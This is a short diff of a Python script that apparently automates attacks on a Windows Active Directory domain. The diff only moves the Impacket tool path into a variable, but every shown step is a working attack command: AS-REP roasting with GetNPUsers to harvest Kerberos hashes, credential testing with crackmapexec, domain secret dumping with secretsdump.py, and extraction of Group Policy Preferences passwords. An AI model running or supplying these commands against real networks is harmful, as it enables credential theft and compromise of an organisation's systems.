@@ -8,6 +8,8 @@ import argparse
 import subprocess
 import re
 
+path_impacket="/opt/impacket/examples"
+
 red = "\033[0;31m"
 green = "\033[0;32m"
 yellow = "\033[0;33m"
@@ -314,7 +316,7 @@ print("")
 printf(' AS-REP Roasting valid users',green)
 os.system('cat kerbrutelog.txt | grep VALID | cut -f2 | cut -d "@" -f1 | cut -d " " -f2 > valid_users.txt')
 os.system("rm kerbrutelog.txt")
-os.system(f'/opt/impacket/examples/GetNPUsers.py -no-pass -usersfile valid_users.txt -dc-ip {ip_to_scan} {Domain_Name}/ > GetNPUsers.log' )
+os.system(f'{path_impacket}/GetNPUsers.py -no-pass -usersfile valid_users.txt -dc-ip {ip_to_scan} {Domain_Name}/ > GetNPUsers.log' )
 os.system('cat GetNPUsers.log | grep krb5 > kerberhashs.txt')
 os.system("rm GetNPUsers.log")
 with open('kerberhashs.txt', 'r') as fichier:
@@ -445,7 +447,7 @@ if len(contenu) !=0:
 
 			os.chdir("../")
 			os.system(f'crackmapexec smb {ip_to_scan} -u {user} -p {passw}')
-			os.system(f'python3 /opt/impacket/examples/secretsdump.py  {Domain_Name}/{user}:{passw}@{ip_to_scan}')
+			os.system(f'python3 {path_impacket}/secretsdump.py  {Domain_Name}/{user}:{passw}@{ip_to_scan}')
 
 		if ssh:
 			os.system(f'crackmapexec ssh {ip_to_scan} -u {user} -p {passw}')
@@ -458,7 +460,7 @@ if len(contenu) !=0:
 
 		for filename in os.listdir("./"):
 			if ".xml" in filename:
-				os.system(f"python /opt/impacket/examples/Get-GPPPassword.py -xmlfile '{filename}' 'LOCAL' " + " | grep 'Username\\|Password' | awk '{print $4}' > xml_cred.txt")
+				os.system(f"python {path_impacket}/Get-GPPPassword.py -xmlfile '{filename}' 'LOCAL' " + " | grep 'Username\\|Password' | awk '{print $4}' > xml_cred.txt")
 				with open("xml_cred.txt","r") as fichier:
 					contenu=fichier.readlines()
 				os.system("rm xml_cred.txt")
